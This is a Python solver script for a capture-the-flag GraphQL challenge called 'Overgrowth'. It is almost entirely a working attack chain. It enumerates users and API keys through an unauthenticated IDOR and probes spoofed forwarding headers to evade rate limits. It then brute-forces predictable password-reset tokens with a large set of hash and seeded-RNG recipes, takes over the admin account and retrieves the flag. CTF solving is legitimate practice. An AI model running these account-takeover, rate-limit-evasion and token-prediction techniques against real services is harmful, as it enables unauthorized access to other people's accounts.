#!/usr/bin/env python3
"""
Overgrowth (HI CyberCon 2026) solver.

Usage:  python3 solve.py https://overgrowth-XXXX.chall.hiddeninvestigations.net

Chain: unauth IDOR user() -> requestPasswordReset (arms per-user token, NOT rate limited)
-> resetPassword(username,token,newPassword):Boolean!  (rate limited ~15/60s PER IP, global;
token is weak/predictable) -> crack recipe on `gardener` -> recompute for `admin`
(the "head gardener") -> login(admin,newpw) -> query { flag }.

Every recipe is a reproducible fn(u,e,uid,ak,sec) so the winner re-derives for admin with
admin's own fresh timestamp. First probes an X-Forwarded-For rate-limit bypass: if it works we
brute the whole set concurrently with rotating IPs, else we fall back to rate-limited priority.
"""
import sys, json, time, hashlib, string, random, uuid, base64, email.utils, threading
import urllib.request, urllib.error, http.cookiejar
from concurrent.futures import ThreadPoolExecutor

BASE = (sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "").strip()
if not BASE: print("usage: solve.py <BASE_URL>"); sys.exit(1)
GQL = BASE + "/graphql"
NEWPW = "Pwned_overgrowth_1!"
BYPASS_HEADER = None  # set once detected

def _rip(): return f"{random.randint(11,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def gql(query, variables=None, headers=None, cookiejar=None, spoof=False):
    body = {"query": query}
    if variables is not None: body["variables"] = variables
    data = json.dumps(body).encode()
    for _ in range(4):
        req = urllib.request.Request(GQL, data=data, method="POST")
        req.add_header("Content-Type", "application/json")
        if spoof and BYPASS_HEADER: req.add_header(BYPASS_HEADER, _rip())
        for k, v in (headers or {}).items(): req.add_header(k, v)
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookiejar)) if cookiejar is not None else urllib.request.build_opener()
        try:
            resp = opener.open(req, timeout=25); raw = resp.read().decode("utf-8","replace")
            try: return json.loads(raw), dict(resp.headers)
            except Exception: return {"__raw__": raw}, dict(resp.headers)
        except urllib.error.HTTPError as e:
            raw = e.read().decode("utf-8","replace")
            try: return json.loads(raw), dict(e.headers)
            except Exception:
                if e.code >= 500: time.sleep(0.4); continue
                return {"__raw__": raw, "__code__": e.code}, dict(e.headers)
        except Exception:
            time.sleep(0.4)
    return {"errors":[{"message":"NETERR"}]}, {}

def server_epoch(h):
    try: return int(email.utils.parsedate_to_datetime(h.get("Date")).timestamp())
    except Exception: return int(time.time())

def req_reset(u):
    o, h = gql('mutation($u:String!){requestPasswordReset(username:$u)}', {"u": u})
    return server_epoch(h)

def reset_result(o):
    if o.get("data") and o["data"].get("resetPassword") is not None: return o["data"]["resetPassword"]
    m = (o.get("errors") or [{}])[0].get("message","?")
    return "RL" if "rate limit" in m else "ERR:"+m[:60]

def do_reset(u, tok, spoof=False):
    o,_ = gql('mutation($u:String!,$t:String!,$p:String!){resetPassword(username:$u,token:$t,newPassword:$p)}',
              {"u": u, "t": tok, "p": NEWPW}, spoof=spoof)
    return reset_result(o)

# ---------- hashing / alphabets ----------
def md5(s): return hashlib.md5(s.encode()).hexdigest()
def sha1(s): return hashlib.sha1(s.encode()).hexdigest()
def sha256(s): return hashlib.sha256(s.encode()).hexdigest()
def sha512(s): return hashlib.sha512(s.encode()).hexdigest()
HASHES = {"md5":md5,"sha1":sha1,"sha256":sha256,"sha512":sha512}
ALPHA = {"low36":string.ascii_lowercase+string.digits,"hex":"0123456789abcdef","HEX":"0123456789ABCDEF",
         "alnum":string.ascii_letters+string.digits,"dig":string.digits,
         "urlsafe":string.ascii_letters+string.digits+"-_","up36":string.ascii_uppercase+string.digits}

# ---------- recipe construction: fn(u,e,uid,ak,sec) -> token ----------
def build_recipes():
    R=[]  # (name, fn, timed)
    def add(name, fn, timed=False): R.append((name, fn, timed))

    # ===== PRIORITY: timestamp-as-token & simple time hashes (classic, never truly tested) =====
    add("str(sec)", lambda u,e,uid,ak,s: str(s), True)
    add("str(sec*1000)", lambda u,e,uid,ak,s: str(s*1000), True)
    for hn,hf in HASHES.items():
        add(f"{hn}(str(sec))", (lambda hf: lambda u,e,uid,ak,s: hf(str(s)))(hf), True)
        add(f"{hn}(u+str(sec))", (lambda hf: lambda u,e,uid,ak,s: hf(u+str(s)))(hf), True)
        add(f"{hn}(u+':'+str(sec))", (lambda hf: lambda u,e,uid,ak,s: hf(u+":"+str(s)))(hf), True)

    # ===== PRIORITY: time-seeded RNG =====
    def seeded(seedfn, cons, timed):
        return lambda u,e,uid,ak,s: (random.seed(seedfn(u,e,uid,ak,s)), cons())[1]
    cons_list = []
    cons_list.append(("randint(100000,999999)", lambda: str(random.randint(100000,999999))))
    cons_list.append(("randint(0,999999).zfill6", lambda: str(random.randint(0,999999)).zfill(6)))
    cons_list.append(("randint(1000,9999)", lambda: str(random.randint(1000,9999))))
    cons_list.append(("random()", lambda: str(random.random())))
    for an,al in ALPHA.items():
        for k in (4,6,8,16,32):
            cons_list.append((f"choices({an},{k})", (lambda al,k: lambda: "".join(random.choices(al,k=k)))(al,k)))
    for nb in (32,64,128,160,256):
        cons_list.append((f"getrandbits({nb})", (lambda nb: lambda: "%x"%random.getrandbits(nb))(nb)))
        cons_list.append((f"getrandbits({nb})pad", (lambda nb: lambda: format(random.getrandbits(nb),'0%dx'%(nb//4)))(nb)))
    for nb in (4,8,16,20,32):
        cons_list.append((f"randbytes({nb}).hex", (lambda nb: lambda: random.randbytes(nb).hex())(nb)))
    cons_list.append(("uuidint", lambda: str(uuid.UUID(int=random.getrandbits(128)))))
    cons_list.append(("uuidint.hex", lambda: uuid.UUID(int=random.getrandbits(128)).hex))
    for skip in (1,2,3):
        cons_list.append((f"skip{skip}.choices(low36,32)", (lambda skip: lambda: ([random.random() for _ in range(skip)], "".join(random.choices(ALPHA['low36'],k=32)))[1])(skip)))
        cons_list.append((f"skip{skip}.choices(hex,32)", (lambda skip: lambda: ([random.random() for _ in range(skip)], "".join(random.choices(ALPHA['hex'],k=32)))[1])(skip)))

    # time seeds (priority subset of constructions first, then all)
    prio_cons = [c for c in cons_list if c[0] in
        ("randint(100000,999999)","randint(0,999999).zfill6","choices(dig,6)","choices(low36,32)",
         "choices(hex,32)","choices(alnum,16)","choices(low36,16)","getrandbits(128)pad","randbytes(16).hex","uuidint")]
    for cn,cf in prio_cons:
        add(f"seed(sec);{cn}", (lambda cf: lambda u,e,uid,ak,s:(random.seed(s), cf())[1])(cf), True)

    # ===== deterministic hashes of user fields (beyond already-tested md5/sha(username)) =====
    def bases(u,e,uid,ak):
        local=e.split("@")[0] if "@" in e else e
        return {"u":u,"e":e,"uid":str(uid),"ak":ak,"local":local,"aksuf":ak.split("_")[-1],
                "u+reset":u+"reset","reset+u":"reset"+u,"u_reset":u+"_reset","reset_u":"reset_"+u,
                "u+uid":u+str(uid),"u:uid":u+":"+str(uid),"og+u":"overgrowth"+u,"u+og":u+"overgrowth"}
    for bk in ["u","e","uid","ak","local","aksuf","u+reset","reset+u","u_reset","reset_u","u+uid","u:uid","og+u","u+og"]:
        add(f"raw:{bk}", (lambda bk: lambda u,e,uid,ak,s: bases(u,e,uid,ak)[bk])(bk))
        for hn,hf in HASHES.items():
            add(f"{hn}({bk})", (lambda bk,hf: lambda u,e,uid,ak,s: hf(bases(u,e,uid,ak)[bk]))(bk,hf))
            for tr in (6,8,16,24,32):
                add(f"{hn}({bk})[:{tr}]", (lambda bk,hf,tr: lambda u,e,uid,ak,s: hf(bases(u,e,uid,ak)[bk])[:tr])(bk,hf,tr))

    # ===== fixed-seed & user-seed & id-seed RNG (all constructions) =====
    def seed_family(seedname, seedfn, timed):
        for cn,cf in cons_list:
            add(f"seed({seedname});{cn}", (lambda seedfn,cf: lambda u,e,uid,ak,s:(random.seed(seedfn(u,e,uid,ak,s)), cf())[1])(seedfn,cf), timed)
    for sd in [0,1,2,3,42,1337,2024,2026,7,100]:
        seed_family(str(sd), (lambda sd: lambda u,e,uid,ak,s: sd)(sd), False)
    seed_family("uid", lambda u,e,uid,ak,s: uid, False)
    seed_family("len(u)", lambda u,e,uid,ak,s: len(u), False)
    seed_family("u", lambda u,e,uid,ak,s: u, False)
    seed_family("e", lambda u,e,uid,ak,s: e, False)
    # all time-seeded constructions (lower priority tail)
    seed_family("sec", lambda u,e,uid,ak,s: s, True)
    seed_family("sec*1000", lambda u,e,uid,ak,s: s*1000, True)
    # all time hashes tail
    seps=["","-","_",":","|","/","."]
    for a_k in ["u","e","local","uid",""]:
        for sep in seps:
            for tsk in ["sec","ms"]:
                for order in ["a+ts","ts+a"]:
                    for hn,hf in HASHES.items():
                        def mk(a_k,sep,tsk,order,hf):
                            def f(u,e,uid,ak,s):
                                local=e.split("@")[0] if "@" in e else e
                                a={"u":u,"e":e,"local":local,"uid":str(uid),"":""}[a_k]
                                ts=str(s) if tsk=="sec" else str(s*1000)
                                combo=(a+sep+ts) if order=="a+ts" else (ts+sep+a)
                                return hf(combo)
                            return f
                        add(f"{hn}({a_k}{sep}{tsk}:{order})", mk(a_k,sep,tsk,order,hf), True)
    # dedup by name
    seen=set(); out=[]
    for n,fn,t in R:
        if n in seen: continue
        seen.add(n); out.append((n,fn,t))
    return out

RECIPES = build_recipes()
RMAP = {n:(fn,t) for n,fn,t in RECIPES}

def candidates_for(u,e,uid,ak,T, names=None, sec_window=(0,-1,1,-2,2)):
    seen=set()
    pool = [(n,RMAP[n][0],RMAP[n][1]) for n in names] if names else RECIPES
    for name,fn,timed in pool:
        for off in (sec_window if timed else (0,)):
            try: tok=fn(u,e,uid,ak,T+off)
            except Exception: continue
            if not isinstance(tok,str) or not tok: continue
            key=(name,tok)
            if key in seen: continue
            seen.add(key); yield (name,off,tok)

# ---------- rate-limit bypass probe ----------
def detect_bypass():
    global BYPASS_HEADER
    for _ in range(16): do_reset("gardener", "rl"+str(random.random()))
    base = do_reset("gardener", "rlcheck")
    if base != "RL":
        print("    (not rate limited right now; treating as no-bypass-needed/global slow)")
    for h in ["X-Forwarded-For","X-Real-IP","X-Originating-IP","X-Client-IP","CF-Connecting-IP","True-Client-IP","Client-IP","X-Forwarded"]:
        results=set()
        for _ in range(3):
            o,_=gql('mutation($u:String!,$t:String!,$p:String!){resetPassword(username:$u,token:$t,newPassword:$p)}',
                    {"u":"gardener","t":"bp","p":NEWPW}, headers={h:_rip()})
            results.add(reset_result(o))
        if any(r in (True,False) for r in results):
            BYPASS_HEADER=h; print(f"[+] rate-limit bypass via header: {h}"); return h
    print("[-] no IP-spoof rate-limit bypass found; will respect ~15/min")
    return None

# ---------- cracking ----------
def crack_concurrent(u,e,uid,ak,T):
    cands=list(candidates_for(u,e,uid,ak,T))
    print(f"[*] concurrent brute (bypass): {len(cands)} candidates")
    found=[]; lock=threading.Lock()
    def work(c):
        if found: return
        name,off,tok=c
        r=do_reset(u,tok,spoof=True)
        if r is True:
            with lock: found.append((name,off,tok))
    with ThreadPoolExecutor(max_workers=24) as ex:
        for _ in ex.map(work,cands):
            if found: break
    return found[0] if found else None

def crack_ratelimited(u,e,uid,ak,T, cap=220):
    cands=list(candidates_for(u,e,uid,ak,T))[:cap]
    print(f"[*] rate-limited crack: trying {len(cands)} prioritized candidates (~15/min)")
    for i,(name,off,tok) in enumerate(cands):
        while True:
            r=do_reset(u,tok)
            if r=="RL": print("   [RL; sleep 62s]"); time.sleep(62); continue
            if isinstance(r,str) and r.startswith("ERR"): print("   ",r,"-> sleep3"); time.sleep(3); continue
            break
        tag=f"{name}(sec{off:+d})" if off else name
        print(f"    [{i+1}/{len(cands)}] {tag:46} {tok[:18]:18} -> {r}")
        if r is True: return (name,off,tok)
    return None

def main():
    print(f"[*] target {BASE}")
    users={}
    for name in ["admin","gardener","sprout"]:
        o,_=gql('query($u:String!){user(username:$u){id username email role apiKey}}',{"u":name})
        uu=o.get("data",{}).get("user")
        if uu: users[name]=uu; print(f"    {name}: id={uu['id']} role={uu['role']} apiKey={uu['apiKey']}")
    if "gardener" not in users or "admin" not in users:
        print("[!] user enum failed"); return
    g=users["gardener"]; a=users["admin"]

    detect_bypass()
    print("[*] arming gardener reset token ...")
    T=req_reset("gardener"); print(f"    T={T}")
    win = crack_concurrent("gardener",g["email"],int(g["id"]),g["apiKey"],T) if BYPASS_HEADER \
          else crack_ratelimited("gardener",g["email"],int(g["id"]),g["apiKey"],T)
    if not win:
        print("[!] recipe not found in set — expand hypotheses."); return
    name,off,tok=win; print(f"[+] CRACKED gardener recipe={name} off={off} token={tok}")
    fn,timed=RMAP[name]

    print("[*] applying to admin ...")
    Ta=req_reset("admin")
    admin_tok=None
    offs=[off,off-1,off+1,off-2,off+2] if timed else [0]
    for ao in offs:
        t=fn("admin",a["email"],int(a["id"]),a["apiKey"],Ta+ao)
        r=do_reset("admin",t, spoof=bool(BYPASS_HEADER))
        while r=="RL": print("   [RL; sleep 62s]"); time.sleep(62); r=do_reset("admin",t,spoof=bool(BYPASS_HEADER))
        print(f"    admin off{ao:+d} {t[:18]:18} -> {r}")
        if r is True: admin_tok=t; break
    if not admin_tok: print("[!] admin recipe mismatch"); return
    print(f"[+] admin password reset -> {NEWPW}")

    print("[*] login as admin ...")
    cj=http.cookiejar.CookieJar()
    o,h=gql('mutation($u:String!,$p:String!){login(username:$u,password:$p){token user{id username role}}}',
            {"u":"admin","p":NEWPW}, cookiejar=cj)
    print("    login:", json.dumps(o), "| Set-Cookie:", h.get("Set-Cookie"))
    tok=(o.get("data",{}).get("login") or {}).get("token")
    o,_=gql('{ flag }', cookiejar=cj); print("[*] flag via session cookie:", json.dumps(o))
    if o.get("data",{}).get("flag"): print("\n[FLAG]", o["data"]["flag"]); return
    if tok:
        for hn,hv in [("Authorization",f"Bearer {tok}"),("Authorization",tok),("Api-Key",tok),
                      ("X-Auth-Token",tok),("Cookie",f"token={tok}"),("Cookie",f"session={tok}")]:
            o,_=gql('{ flag }', headers={hn:hv})
            print(f"    flag via {hn}={str(hv)[:22]} -> {json.dumps(o)}")
            if o.get("data",{}).get("flag"): print("\n[FLAG]", o["data"]["flag"]); return
    print("[!] authenticated but flag still gated — inspect role gate / head_gardener requirement.")

if __name__=="__main__":
    main()
